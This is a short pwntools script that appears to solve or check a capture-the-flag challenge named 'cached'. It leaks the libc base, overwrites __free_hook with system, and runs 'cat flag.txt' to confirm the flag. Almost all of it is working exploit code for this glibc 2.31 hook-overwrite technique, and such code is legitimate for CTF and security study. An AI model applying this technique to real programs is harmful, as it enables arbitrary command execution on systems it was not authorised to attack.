from pwn import *

context.binary = elf = ELF("./cached")
libc = ELF("./libc-2.31.so")

conn = elf.process()

conn.sendline("")
conn.sendline("")
conn.sendline("")
conn.sendline("")

conn.recvuntil("system @")
libc.address = int(conn.recvline(), 0) - libc.symbols["system"]

conn.sendline(p64(libc.symbols["__free_hook"]));
conn.sendline(p64(libc.symbols["system"]));

for _ in range(8):
  conn.recvuntil("```\n")

conn.sendline("cat flag.txt")
flag = conn.recvline()

if b"idek" in flag:
  print(flag)
  exit(0)
else:
  exit(1)

conn.interactive()
